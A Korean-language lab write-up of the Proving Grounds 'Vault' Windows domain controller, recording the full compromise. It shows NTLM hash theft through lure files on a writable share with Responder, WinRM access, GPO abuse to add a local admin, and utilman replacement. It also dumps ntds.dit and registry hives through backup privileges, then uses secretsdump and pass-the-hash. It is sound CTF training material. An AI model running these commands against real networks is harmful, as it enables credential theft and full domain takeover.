---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/ad/dcsync
  - tech/ad/ntlm-relay
  - tech/ad/pth
  - tech/ad/bloodhound
  - tech/ad/gpo-abuse
  - tech/win/sebackup
  - tech/web/lfi-rfi
  - tech/svc/smb
  - tech/exec/winrm
  - tech/exec/psexec
type: machine
platform: pg
os: windows
ip: 192.168.120.172
domain: vault.offsec
ports: [53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3389, 5985, 9389]
services: [domain, http, kerberos-sec, kpasswd5, ldap, mc-nmf, microsoft-ds, ms-wbt-server, msrpc, ncacn_http, netbios-ssn]
status: solved
tech_count: 10
---
## Nmap
```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ nnmap 192.168.120.172                                                                             Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-08 09:15 +0900
Nmap scan report for 192.168.120.172
Host is up (0.085s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-08 00:15:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2026-07-07T00:13:45
|_Not valid after:  2027-01-06T00:13:45
|_ssl-date: 2026-07-08T00:17:35+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-08T00:16:55+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-07-08T00:16:56
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   84.36 ms 192.168.45.1
2   84.22 ms 192.168.45.254
3   84.67 ms 192.168.251.1
4   85.10 ms 192.168.120.172

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.55 seconds
```

웹페이지 없음을 확인 후 SMB 체크 진행
```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ smbclient -L 192.168.120.172 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DocumentsShare  Disk
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.120.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
![[Pasted image 20260708103721.png]]

서버 접근 후 업로드 가능여부 확인
```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ smbclient //192.168.120.172/DocumentsShare -U ''
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Nov 19 17:59:02 2021
  ..                                  D        0  Fri Nov 19 17:59:02 2021

                7706623 blocks of size 4096. 712639 blocks available
smb: \> put test.txt
putting file test.txt as \test.txt (0.0 kB/s) (average 0.0 kB/s)
smb: \> ls
  .                                   D        0  Wed Jul  8 10:38:11 2026
  ..                                  D        0  Wed Jul  8 10:38:11 2026
  test.txt                            A        5  Wed Jul  8 10:38:11 2026

                7706623 blocks of size 4096. 712624 blocks available
smb: \>
```

![[Pasted image 20260708103849.png]]

추가 방법 smbmap 사용하여 확인 가능
```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ smbmap -H 192.168.120.172 -u anonymous

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                                        [|] Checking for open ports...                                                                        [*] Detected 1 hosts serving SMB
[/] Initializing hosts...
[-] Authenticating...
[\] Authenticating...

[+] IP: 192.168.120.172:445     Name: 192.168.120.172           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DocumentsShare                                          READ, WRITE
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        SYSVOL                                                  NO ACCESS       Logon server share
```


NTLM hash 탈취 할 수 있도록 steal 파일 생성
```bash
┌──(kali㉿kali)-[~/git/ntlm_theft]
└─$ python ntlm_theft.py -g all -s 192.168.45.175 -f steal
/home/kali/git/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: steal/steal.scf (BROWSE TO FOLDER)
Created: steal/steal-(url).url (BROWSE TO FOLDER)
Created: steal/steal-(icon).url (BROWSE TO FOLDER)
Created: steal/steal.lnk (BROWSE TO FOLDER)
Created: steal/steal.rtf (OPEN)
Created: steal/steal-(stylesheet).xml (OPEN)
Created: steal/steal-(fulldocx).xml (OPEN)
Created: steal/steal.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: steal/steal-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: steal/steal-(includepicture).docx (OPEN)
Created: steal/steal-(remotetemplate).docx (OPEN)
Created: steal/steal-(frameset).docx (OPEN)
Created: steal/steal-(externalcell).xlsx (OPEN)
Created: steal/steal.wax (OPEN)
Created: steal/steal.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: steal/steal.asx (OPEN)
Created: steal/steal.jnlp (OPEN)
Created: steal/steal.application (DOWNLOAD AND OPEN)
Created: steal/steal.pdf (OPEN AND ALLOW)
Created: steal/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: steal/steal.library-ms (BROWSE TO FOLDER)
Created: steal/Autorun.inf (BROWSE TO FOLDER)
Created: steal/desktop.ini (BROWSE TO FOLDER)
Created: steal/steal.theme (THEME TO INSTALL
Generation Complete.
```
![[Pasted image 20260708103551.png]]


생성된 steal 파일 업로드 
```bash
┌──(kali㉿kali)-[~/git/ntlm_theft/steal]
└─$ smbclient //192.168.120.172/DocumentsShare -N -c 'prompt OFF; mput *'
putting file steal.application as \steal.application (6.3 kB/s) (average 6.3 kB/s)
putting file steal-(stylesheet).xml as \steal-(stylesheet).xml (0.6 kB/s) (average 3.5 kB/s)
putting file steal-(fulldocx).xml as \steal-(fulldocx).xml (166.0 kB/s) (average 77.7 kB/s)
putting file steal.theme as \steal.theme (6.6 kB/s) (average 62.5 kB/s)
putting file steal.lnk as \steal.lnk (8.4 kB/s) (average 53.0 kB/s)
putting file steal-(frameset).docx as \steal-(frameset).docx (38.6 kB/s) (average 50.8 kB/s)
putting file desktop.ini as \desktop.ini (0.2 kB/s) (average 44.3 kB/s)
putting file zoom-attack-instructions.txt as \zoom-attack-instructions.txt (0.4 kB/s) (average 39.1 kB/s)
putting file steal.pdf as \steal.pdf (3.0 kB/s) (average 35.4 kB/s)
putting file steal-(url).url as \steal-(url).url (0.2 kB/s) (average 31.8 kB/s)
putting file steal.rtf as \steal.rtf (0.4 kB/s) (average 29.1 kB/s)
putting file steal.library-ms as \steal.library-ms (4.7 kB/s) (average 27.2 kB/s)
putting file steal.htm as \steal.htm (0.3 kB/s) (average 25.3 kB/s)
putting file steal-(remotetemplate).docx as \steal-(remotetemplate).docx (98.0 kB/s) (average 30.3 kB/s)
putting file steal.scf as \steal.scf (0.3 kB/s) (average 28.4 kB/s)
putting file steal-(icon).url as \steal-(icon).url (0.4 kB/s) (average 26.7 kB/s)
putting file steal.asx as \steal.asx (0.6 kB/s) (average 25.2 kB/s)
putting file steal-(handler).htm as \steal-(handler).htm (0.4 kB/s) (average 23.9 kB/s)
putting file steal.jnlp as \steal.jnlp (0.8 kB/s) (average 22.8 kB/s)
putting file steal-(includepicture).docx as \steal-(includepicture).docx (37.9 kB/s) (average 23.5 kB/s)
putting file Autorun.inf as \Autorun.inf (0.3 kB/s) (average 22.5 kB/s)
putting file steal.m3u as \steal.m3u (0.2 kB/s) (average 21.5 kB/s)
putting file steal-(externalcell).xlsx as \steal-(externalcell).xlsx (22.5 kB/s) (average 21.5 kB/s)
putting file steal.wax as \steal.wax (0.2 kB/s) (average 20.7 kB/s)

```
![[Pasted image 20260708103537.png]]



responder 로 대기
```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
```

![[Pasted image 20260708103424.png]]

NTLM 탈취 완료
```bash
[SMB] NTLMv2-SSP Client   : 192.168.120.172
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:66134a3a082ecb7b:751AA3935EA2F39C8A6C49162F7C6AB5:010100000000000080A4BEC5C30EDD0145715E4350EED7450000000002000800540033005100580001001E00570049004E002D0058005800360043005A00490052004D0032005800380004003400570049004E002D0058005800360043005A00490052004D003200580038002E0054003300510058002E004C004F00430041004C000300140054003300510058002E004C004F00430041004C000500140054003300510058002E004C004F00430041004C000700080080A4BEC5C30EDD01060004000200000008003000300000000000000001000000002000001830F0C706803F0173332094F5B2BB5FB0C4DAD79922348512363CC7DC51C8100A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370035000000000000000000
```
![[Pasted image 20260708103353.png]]


획득한 자격증명 확인
```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ nxc-sweep 192.168.120.172 -u 'anirudh' -p 'SecureHM'
[*] Starting NXC sweep for 192.168.120.172 as anirudh ...

[+] Port 445 open. Checking smb ...
SMB         192.168.120.172 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False)
SMB         192.168.120.172 445    DC               [+] vault.offsec\anirudh:SecureHM
SMB         192.168.120.172 445    DC               [*] Enumerated shares
SMB         192.168.120.172 445    DC               Share           Permissions     Remark
SMB         192.168.120.172 445    DC               -----           -----------     ------
SMB         192.168.120.172 445    DC               ADMIN$          READ            Remote Admin
SMB         192.168.120.172 445    DC               C$              READ,WRITE      Default share
SMB         192.168.120.172 445    DC               DocumentsShare
SMB         192.168.120.172 445    DC               IPC$            READ            Remote IPC
SMB         192.168.120.172 445    DC               NETLOGON        READ            Logon server share
SMB         192.168.120.172 445    DC               SYSVOL          READ            Logon server share

[+] Port 5985 open. Checking winrm ...
WINRM       192.168.120.172 5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:vault.offsec)
WINRM       192.168.120.172 5985   DC               [+] vault.offsec\anirudh:SecureHM (Pwn3d!)

[+] Port 3389 open. Checking rdp ...
RDP         192.168.120.172 3389   DC               [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC) (domain:vault.offsec) (nla:False)
RDP         192.168.120.172 3389   DC               [+] vault.offsec\anirudh:SecureHM

[-] Port 1433 closed/filtered. Skipping mssql

[-] Port 21 closed/filtered. Skipping ftp

[*] All active services checked.
```

![[Pasted image 20260708104729.png]]

evil-winrm 접근 후 flag 확인
```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ evil-winrm -i 192.168.120.172 -u 'anirudh' -p 'SecureHM'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\anirudh\Documents> cd ..
*Evil-WinRM* PS C:\Users\anirudh> cd desktop
*Evil-WinRM* PS C:\Users\anirudh\desktop> type local.txt
5a3377f8afb97ee39a988c201052df14
*Evil-WinRM* PS C:\Users\anirudh\desktop>
```

![[Pasted image 20260708104942.png]]

bloodhound-pyhon 사용하여 json 파일 확보
```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ bloodhound-python -u anirudh -p SecureHM -d Vault.offsec -ns 192.168.120.172 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: vault.offsec
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.vault.offsec:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.vault.offsec
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.vault.offsec
INFO: Found 5 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.vault.offsec
INFO: Done in 00M 18S
```

![[Pasted image 20260708125002.png]]

bloodhound 확인해보니 Domain policy 확인
![[Pasted image 20260708131411.png]]
[https://github.com/byronkg/SharpGPOABuse/tree/main/SharpGPOABuse-master](https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master)

git clone 
```bash
┌──(kali㉿kali)-[~/git]
└─$ git clone https://github.com/byronkg/SharpGPOAbuse.git
Cloning into 'SharpGPOAbuse'...
remote: Enumerating objects: 66, done.
remote: Counting objects: 100% (66/66), done.
remote: Compressing objects: 100% (59/59), done.
remote: Total 66 (delta 9), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (66/66), 765.02 KiB | 9.68 MiB/s, done.
Resolving deltas: 100% (9/9), done.

```
![[Pasted image 20260708131710.png]]

업로드 후 명령어 실행
```bash
*Evil-WinRM* PS C:\Users\anirudh\desktop> iwr 192.168.45.175/SharpGPOAbuse.exe -o SharpGPOAbuse.exe
*Evil-WinRM* PS C:\Users\anirudh\desktop> .\SharpGPOAbuse.exe --AddlocalAdmin --GPOName "Default Domain Policy" --UserAccount anirudh
[+] Domain = vault.offsec
[+] Domain Controller = DC.vault.offsec
[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
```
![[Pasted image 20260708132007.png]]

명령어 실행 후 GPO 업데이트
```bash 
*Evil-WinRM* PS C:\Users\anirudh\desktop> gpupdate /force
Updating policy...



Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

![[Pasted image 20260708132047.png]]

관리자 확인
```bash
*Evil-WinRM* PS C:\Users\anirudh\desktop> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
anirudh
The command completed successfully.
```
![[Pasted image 20260708132134.png]]

shell 재실행 후 flag 확인
```bash

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       11/19/2021  12:04 AM                3D Objects
d-r---       11/19/2021  12:04 AM                Contacts
d-r---       11/19/2021   1:10 AM                Desktop
d-r---       11/19/2021  12:04 AM                Documents
d-r---       11/19/2021  12:04 AM                Downloads
d-r---       11/19/2021  12:04 AM                Favorites
d-r---       11/19/2021  12:04 AM                Links
d-r---       11/19/2021  12:04 AM                Music
d-r---       11/19/2021  12:04 AM                Pictures
d-r---       11/19/2021  12:04 AM                Saved Games
d-r---       11/19/2021  12:04 AM                Searches
d-r---       11/19/2021  12:04 AM                Videos


*Evil-WinRM* PS C:\Users\administrator> cd desktop
*Evil-WinRM* PS C:\Users\administrator\desktop> type proof.txt
714b4d1566a4bc88b9a0f45c33b36f0b
```
![[Pasted image 20260708132320.png]]


## 다른 권한 상승방법
```powershell
*Evil-WinRM* PS C:\Users\anirudh\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```
![[Pasted image 20260708132526.png]]

SeRestorePrivilege 활용하여 utilman 변조
```powershell
*Evil-WinRM* PS C:\Users\anirudh\Documents> cd c:\windows
*Evil-WinRM* PS C:\windows> cd system32
*Evil-WinRM* PS C:\windows\system32> ren utilman.exe utilman.old
*Evil-WinRM* PS C:\windows\system32> ren cmd.exe Utilman.exe
```

RDP 접속 
```bash
┌──(kali㉿kali)-[~]
└─$ xfreerdp3 /u:anirudh /p:SecureHM /v:192.168.120.172 /cert:ignore /sec:tls   
```

RDP 접속 후 win+U 버튼 누른 후 Utillman.exe가 LocalSystem 권한으로 실행하여 flag 확인
![[Pasted image 20260708134045.png]]


## SebackupPrivilege 활용

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit C:\temp\ntds.dit -Overwrite
reg save hklm\system C:\temp\system.**hive**
```

로컬 하이브 (SAM/SECURITY)
```powershell
reg save hklm\sam C:\temp\sam.hive
reg save hklm\security C:\temp\security.hive
```

해시추출
```bash
# 도메인 전체 (ntds)
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
# 로컬 + LSA
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
```

ntds에서 나온 administratorNT해시로 PtH하면 도메인 장악
```bash
impacket-psexec -hashes :<Admin_NThash> vault.offsec/Administrator@<target>
# 또는 krbtgt 해시로 골든 티켓
```

파일 위치
```bash
┌──(kali㉿kali)-[~/…/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug]
└─$ ls
SeBackupPrivilegeCmdLets.dll  SeBackupPrivilegeUtils.dll

┌──(kali㉿kali)-[~/…/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug]
└─$ pwd
/home/kali/git/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug
```


diskshadow + robocopy
```cmd
# evil-winrm(anirudh)에서
# 1) diskshadow 스크립트 작성
echo set context persistent nowriters > C:\temp\ds.txt
echo add volume c: alias raj >> C:\temp\ds.txt
echo create >> C:\temp\ds.txt
echo expose %raj% z: >> C:\temp\ds.txt
diskshadow /s C:\temp\ds.txt
# 2) 섀도카피에서 백업 모드로 ntds.dit 복사
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
# 3) SYSTEM 하이브 저장
reg save hklm\system C:\temp\system.hive
```